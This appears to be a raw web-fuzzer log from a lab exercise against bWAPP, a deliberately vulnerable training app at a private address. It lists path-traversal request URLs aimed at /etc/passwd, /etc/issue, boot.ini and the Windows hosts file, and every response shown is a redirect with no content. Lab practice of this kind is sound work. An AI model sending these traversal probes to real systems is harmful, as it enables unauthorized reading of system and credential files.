2161,302,0L,0W,http://10.0.2.4/bWAPP/.?/etc/passwd
2162,302,0L,0W,http://10.0.2.4/bWAPP/.?/etc/issue
2164,302,0L,0W,http://10.0.2.4/bWAPP/.?/windows/system32/drivers/etc/hosts
2165,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/etc/passwd
2166,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/etc/issue
2167,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/boot.ini
2163,302,0L,0W,http://10.0.2.4/bWAPP/.?/boot.ini
2168,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/windows/system32/drivers/etc/hosts
2170,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/etc/issue
2169,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/etc/passwd
2171,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/boot.ini
2173,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/etc/passwd
2174,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/etc/issue
2175,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/boot.ini
2176,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/windows/system32/drivers/etc/hosts
2178,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/.?/etc/issue
2179,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/.?/boot.ini
2177,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/.?/etc/passwd
2180,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/.?/windows/system32/drivers/etc/hosts
2184,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/.?/.?/windows/system32/drivers/etc/hosts
2181,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/.?/.?/etc/passwd
2182,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/.?/.?/etc/issue
2186,302,0L,0W,http://10.0.2.4/bWAPP/.?\etc\issue
2185,302,0L,0W,http://10.0.2.4/bWAPP/.?\etc\passwd
2188,302,0L,0W,http://10.0.2.4/bWAPP/.?\windows\system32\drivers\etc\hosts
2183,302,0L,0W,http://10.0.2.4/bWAPP/.?/.?/.?/.?/.?/.?/boot.ini
2187,302,0L,0W,http://10.0.2.4/bWAPP/.?\boot.ini
2191,302,0L,0W,http://10.0.2.4/bWAPP/.?\.?\boot.ini
